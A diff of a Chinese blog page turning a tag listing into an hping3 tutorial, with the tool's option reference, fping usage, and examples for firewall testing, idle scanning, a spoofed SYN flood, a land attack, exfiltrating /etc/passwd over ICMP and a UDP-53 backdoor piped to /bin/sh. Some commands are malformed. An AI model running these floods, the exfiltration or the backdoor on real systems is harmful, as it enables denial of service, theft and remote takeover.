@@ -2,22 +2,24 @@
 <html lang="zh">
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-<title>标签: vs code - 时光走了你还在的博客</title>
+<title>hping3使用详解 - 时光走了你还在的博客</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
 
-    <meta name="description" content="a personal blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="时光走了你还在的博客">
-<meta property="og:url" content="http://yoursite.com/tags/vs-code/index.html">
+    <meta name="description" content="hping3   &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hping 是面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，目前最新版是 hping3，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用">
+<meta name="keywords" content="kali linux,hping3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hping3使用详解">
+<meta property="og:url" content="http://yoursite.com/2019/11/25/hping3使用详解/index.html">
 <meta property="og:site_name" content="时光走了你还在的博客">
-<meta property="og:description" content="a personal blog">
+<meta property="og:description" content="hping3   &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hping 是面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，目前最新版是 hping3，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://yoursite.com/images/og_image.png">
+<meta property="og:updated_time" content="2019-11-25T15:29:34.834Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="时光走了你还在的博客">
-<meta name="twitter:description" content="a personal blog">
+<meta name="twitter:title" content="hping3使用详解">
+<meta name="twitter:description" content="hping3   &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hping 是面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，目前最新版是 hping3，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用">
 <meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
 
 
@@ -94,7 +96,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/code.ico" alt="时光走了你还在的博客" height="28">
+                <img src="/images/code.ico" alt="hping3使用详解" height="28">
             
             </a>
         </div>
@@ -140,33 +142,22 @@
         <div class="container">
             <div class="columns">
                 <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
-    <div class="card-content">
-        <nav class="breadcrumb" aria-label="breadcrumbs">
-        <ul>
-            <li><a href="/tags">标签</a></li>
-            <li class="is-active"><a href="#" aria-current="page">vs code</a></li>
-        </ul>
-        </nav>
-    </div>
-</div>
-
-    <div class="card">
     
     <div class="card-content article ">
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-11-25T14:19:00.000Z">2019-11-25</time>
+                <time class="level-item has-text-grey" datetime="2019-11-25T15:10:00.000Z">2019-11-25</time>
                 
                 <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/code/">code</a>
+                <a class="has-link-grey -link" href="/categories/渗透测试/">渗透测试</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/渗透测试/网络攻防/">网络攻防</a>
                 </div>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    7 分钟 读完 (大约 1003 个字)
+                    23 分钟 读完 (大约 3516 个字)
                 </span>
                 
                 
@@ -175,33 +166,129 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                <a class="has-link-black-ter" href="/2019/11/25/vs-code使用mingw-w64编译运行c/">vs code使用mingw-w64编译运行c</a>
+                hping3使用详解
             
         </h1>
         <div class="content">
-            <h2 id="在VS-Code中使用Mingw-w64"><a href="#在VS-Code中使用Mingw-w64" class="headerlink" title="在VS Code中使用Mingw-w64"></a>在VS Code中使用Mingw-w64</h2><p>1.安装Visual Studio代码。<br>2.为VS Code安装C ++扩展。<br>3.Mingw-w64安装到其路径中没有空格的文件夹（换句话说，不是C:/Program Files/的默认位置）。在本教程中，我们假定将其安装在下C:\Mingw-w64。  </p>
+            <p><strong><em>hping3</em></strong><br>   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hping 是面向命令行的用于生成和解析TCP/IP协议数据包汇编/分析的开源工具。作者是Salvatore Sanfilippo，界面灵感来自ping（8）unix命令，目前最新版是 hping3，它支持TCP，UDP，ICMP和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping 优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。<br>   <a id="more"></a><br>   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然 hping 以前主要用作安全工具，但它可以在许多方面被不太关心安全性的人员用于测试网络和主机，您可以使用hping的一小部分内容：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- 防火墙测试</span><br><span class="line">- 高级端口扫描</span><br><span class="line">- 网络测试，使用不同的协议，TOS，分片</span><br><span class="line">- 手动路径MTU发现</span><br><span class="line">- 在所有支持的协议下，高级traceroute</span><br><span class="line">- 远程操作系统指纹</span><br><span class="line">- 远程正常运行时间猜测</span><br><span class="line">- TCP/IP协议栈审计</span><br><span class="line">- hping也可以用于学习TCP/IP的学生</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">用法: hping3 host [options]</span><br><span class="line">  -h  --help      显示帮助</span><br><span class="line">  -v  --version   显示版本</span><br><span class="line">  -c  --count     发送数据包的数目</span><br><span class="line">  -i  --interval  发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000)</span><br><span class="line">      --fast      等同 -i u10000 (每秒10个包)</span><br><span class="line">      --faster    等同 -i u1000 (每秒100个包)</span><br><span class="line">      --flood	  尽最快发送数据包，不显示回复。</span><br><span class="line">  -n  --numeric   数字化输出，象征性输出主机地址。</span><br><span class="line">  -q  --quiet     安静模式</span><br><span class="line">  -I  --interface 网卡接口 (默认路由接口)</span><br><span class="line">  -V  --verbose   详细模式</span><br><span class="line">  -D  --debug     调试信息</span><br><span class="line">  -z  --bind      绑定ctrl+z到ttl(默认为目的端口)</span><br><span class="line">  -Z  --unbind    取消绑定ctrl+z键</span><br><span class="line">      --beep      对于接收到的每个匹配数据包蜂鸣声提示</span><br><span class="line"></span><br><span class="line">模式选择</span><br><span class="line">  default mode     TCP   // 默认模式是 TCP</span><br><span class="line">  -0  --rawip      RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。</span><br><span class="line">  -1  --icmp       ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。</span><br><span class="line">  -2  --udp        UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。</span><br><span class="line">  -8  --scan       SCAN mode. //扫描模式 指定扫描对应的端口。</span><br><span class="line">                   Example: hping --scan 1-30,70-90 -S www.target.host    // 扫描</span><br><span class="line">  -9  --listen     listen mode  // 监听模式</span><br><span class="line">  </span><br><span class="line">IP 模式</span><br><span class="line">  -a  --spoof      spoof source address  //源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。</span><br><span class="line">  --rand-dest      random destionation address mode. see the man. // 随机目的地址模式。详细使用 man 命令</span><br><span class="line">  --rand-source    random source address mode. see the man.       // 随机源地址模式。详细使用 man 命令</span><br><span class="line">  -t  --ttl        ttl (默认 64)  //修改 ttl 值</span><br><span class="line">  -N  --id         id (默认 随机)  // hping 中的 ID 值，缺省为随机值</span><br><span class="line">  -W  --winid      使用win* id字节顺序  //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。</span><br><span class="line">  -r  --rel        相对id字段(估计主机流量)  //更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。</span><br><span class="line">  -f  --frag       拆分数据包更多的frag.  (may pass weak acl)   //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。</span><br><span class="line">  -x  --morefrag   设置更多的分段标志    // 大量碎片，泪滴攻击。</span><br><span class="line">  -y  --dontfrag   设置不分段标志    // 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。</span><br><span class="line">  -g  --fragoff    set the fragment offset    // 设置断偏移。</span><br><span class="line">  -m  --mtu        设置虚拟最大传输单元, implies --frag if packet size &gt; mtu    // 设置虚拟MTU值，当大于mtu的时候分段。</span><br><span class="line">  -o  --tos        type of service (default 0x00), try --tos help          // tos字段，缺省0x00，尽力而为？</span><br><span class="line">  -G  --rroute     includes RECORD_ROUTE option and display the route buffer    // 记录IP路由，并显示路由缓冲。</span><br><span class="line">  --lsrr           松散源路由并记录路由        // 松散源路由</span><br><span class="line">  --ssrr           严格源路由并记录路由      // 严格源路由</span><br><span class="line">  -H  --ipproto    设置IP协议字段，仅在RAW IP模式下使用   //在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。</span><br><span class="line"></span><br><span class="line">ICMP 模式</span><br><span class="line">  -C  --icmptype   icmp类型(默认echo请求)    // ICMP类型，缺省回显请求。</span><br><span class="line">  -K  --icmpcode   icmp代号(默认0)     // ICMP代码。</span><br><span class="line">      --force-icmp 发送所有icmp类型(默认仅发送支持的类型)    // 强制ICMP类型。</span><br><span class="line">      --icmp-gw    设置ICMP重定向网关地址(默认0.0.0.0)    // ICMP重定向</span><br><span class="line">      --icmp-ts    等同 --icmp --icmptype 13 (ICMP 时间戳)            // icmp时间戳</span><br><span class="line">      --icmp-addr  等同 --icmp --icmptype 17 (ICMP 地址子网掩码)  // icmp子网地址</span><br><span class="line">      --icmp-help  显示其他icmp选项帮助      // ICMP帮助</span><br><span class="line"></span><br><span class="line">UDP/TCP 模式</span><br><span class="line">  -s  --baseport   base source port             (default random)              // 缺省随机源端口</span><br><span class="line">  -p  --destport   [+][+]&lt;port&gt; destination port(default 0) ctrl+z inc/dec    // 缺省随机源端口</span><br><span class="line">  -k  --keep       keep still source port      // 保持源端口</span><br><span class="line">  -w  --win        winsize (default 64)        // win的滑动窗口。windows发送字节(默认64)</span><br><span class="line">  -O  --tcpoff     set fake tcp data offset     (instead of tcphdrlen / 4)    // 设置伪造tcp数据偏移量(取代tcp地址长度除4)</span><br><span class="line">  -Q  --seqnum     shows only tcp sequence number        // 仅显示tcp序列号</span><br><span class="line">  -b  --badcksum   (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。</span><br><span class="line">  -M  --setseq     设置TCP序列号 </span><br><span class="line">  -L  --setack     设置TCP的ack   ------------------------------------- (不是 TCP 的 ACK 标志位)</span><br><span class="line">  -F  --fin        set FIN flag</span><br><span class="line">  -S  --syn        set SYN flag</span><br><span class="line">  -R  --rst        set RST flag</span><br><span class="line">  -P  --push       set PUSH flag</span><br><span class="line">  -A  --ack        set ACK flag   ------------------------------------- （设置 TCP 的 ACK 标志 位）</span><br><span class="line">  -U  --urg        set URG flag      // 一大堆IP抱头的设置。</span><br><span class="line">  -X  --xmas       set X unused flag (0x40)</span><br><span class="line">  -Y  --ymas       set Y unused flag (0x80)</span><br><span class="line">  --tcpexitcode    使用last tcp-&gt; th_flags作为退出码</span><br><span class="line">  --tcp-mss        启用具有给定值的TCP MSS选项</span><br><span class="line">  --tcp-timestamp  启用TCP时间戳选项来猜测HZ/uptime</span><br><span class="line"></span><br><span class="line">Common //通用设置</span><br><span class="line">  -d  --data       data size    (default is 0)    // 发送数据包大小，缺省是0。</span><br><span class="line">  -E  --file       文件数据</span><br><span class="line">  -e  --sign       添加“签名”</span><br><span class="line">  -j  --dump       转储为十六进制数据包</span><br><span class="line">  -J  --print      转储为可打印字符</span><br><span class="line">  -B  --safe       启用“安全”协议</span><br><span class="line">  -u  --end        告诉你什么时候--file达到EOF并防止倒回</span><br><span class="line">  -T  --traceroute traceroute模式(等同使用 --bind 且--ttl 1)</span><br><span class="line">  --tr-stop        在traceroute模式下收到第一个不是ICMP时退出</span><br><span class="line">  --tr-keep-ttl    保持源TTL固定，仅用于监视一跳</span><br><span class="line">  --tr-no-rtt	   不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）</span><br><span class="line">ARS packet description (new, unstable)</span><br><span class="line">  --apd-send       发送APD描述数据包(参见docs / APD.txt)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>  <strong><em>hping3功能</em></strong><br>  <strong>防火墙测试</strong><br>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。<br>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。<br>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10</span><br></pre></td></tr></table></figure></p>
+<p>  <strong>端口扫描</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -I eth0 -S 192.168.10.1 -p 80</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中-I eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。<br><strong>Idle扫描</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。<br><strong>拒绝服务攻击</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。  </p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其他攻击如smurf、teardrop、land attack等也很容易构建出来。<br><strong>文件传输</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：  </p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 192.168.1.159--listen signature --safe --icmp</span><br></pre></td></tr></table></figure>
+
+<p>监听ICMP包中的签名，根据签名解析出文件内容。<br>在发送端使用签名打包的ICMP包发送文件：  </p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。<br><strong>木马功能</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>
+<p>在木马启动端：  </p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>在远程控制端：  </p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo ls &gt;test.cmd </span><br><span class="line">hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</span><br><span class="line">```  </span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</span><br><span class="line"></span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。  </span><br><span class="line"></span><br><span class="line"> ***fping 用法***  </span><br><span class="line"> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;fping 是一个将  ICMP echo 探测器发送到网络主机的程序，类似于 ping，可以看作是 ping 的增强版。但是 fping 在 ping多个主机时性能更好。</span><br></pre></td></tr></table></figure>
+
+<p> Usage: fping [options] [targets…]<br>   -a         显示存活目标，即可ping通的目标<br>   -A         将目标以ip地址的形式显示</p>
+<p>   -b n       ping 数据包的大小。（默认为56）<br>   -B f       set exponential backoff factor to f<br>   -c n       ping每个目标的次数 (默认为1)<br>   -C n       同-c, 返回的结果为冗长格式<br>   -D         每个输出行打印时间戳<br>   -e         显示返回数据包所费时间<br>   -f file    从文件获取目标列表( - 表示从标准输入)(不能与 -g 同时使用)<br>   -g         生成目标列表(不能与 -f 同时使用)<br>                (可指定目标的开始和结束IP， 或者提供ip的子网掩码)<br>                (例：fping -g 192.168.1.0 192.168.1.255 或 fping -g 192.168.1.0/24)<br>   -H n       设置ip的TTL值 (生存时间)<br>   -i n       ping包之间的间隔(单位：毫秒)(默认25)<br>   -I if      绑定到特定的接口<br>   -l         循环发送ping<br>   -m         ping目标主机的多个网口<br>   -M         设置不分段标记<br>   -n         将目标以主机名或域名显示(等价于 -d )<br>   -N         输出兼容netdata (-l -Q are required)<br>   -o         显示累计中断时间 (lost packets * packet interval)<br>   -O n       在ICMP包中设置服务的类型(tos)标志<br>   -p n       对同一个目标的ping包间隔(毫秒)<br>                 (在循环和统计模式中，默认为1000)<br>   -q         安静模式(不显示每个目标或每个ping的结果)<br>   -Q n       同-q, 但是每n秒显示信息概要<br>   -r n       当ping失败时，最大重试次数(默认为3次)<br>   -R         random packet data (to foil link data compression)<br>   -s         打印最后的统计数据<br>   -S addr    设置源ip地址<br>   -t n       单个目标的超时时间(毫秒)(默认500)<br>   -T n       请忽略(为兼容fping 2.4)<br>   -u         显示不可到达的目标<br>   -v         显示版本号<br>   targets    需要ping的目标列表(不能和 -f 同时使用)<br>   <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*例如*</span><br></pre></td></tr></table></figure></p>
+<p>   fping -A -u -c 4 192.168.1.1 192.168.1.74 192.168.1.20<br>   ```</p>
+
         </div>
         
-        
-        <div class="level is-mobile">
+        <div class="level is-size-7 is-uppercase">
             <div class="level-start">
                 <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/11/25/vs-code使用mingw-w64编译运行c/#more">阅读更多</a>
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/hping3/">hping3</a>, <a class="has-link-grey -link" href="/tags/kali-linux/">kali linux</a>
                 </div>
             </div>
         </div>
         
+        
+        
+        <div class="social-share"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css">
+<script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script>
         
     </div>
 </div>
 
 
 
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="/images/支付宝.jpg" alt="支付宝"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="/images/微信.png" alt="微信"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
 
 
 
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/11/25/vs-code使用mingw-w64编译运行c/">
+                <span class="level-item">vs code使用mingw-w64编译运行c</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
 
 
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="valine-thread" class="content"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#valine-thread' ,
+        notify: false,
+        verify: false,
+        app_id: 'f66CaSlzSp6wLmWCgxAvYhB1-gzGzoHsz',
+        app_key: '2h5EEcDNF1kl6TqJz27xAi0T',
+        placeholder: '说说你的感想'
+    });
+</script>
+
+    </div>
+</div>
 </div>
                 
 
@@ -899,7 +986,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/code.ico" alt="时光走了你还在的博客" height="28">
+                    <img src="/images/code.ico" alt="hping3使用详解" height="28">
                 
                 </a>
                 <p class="is-size-7">
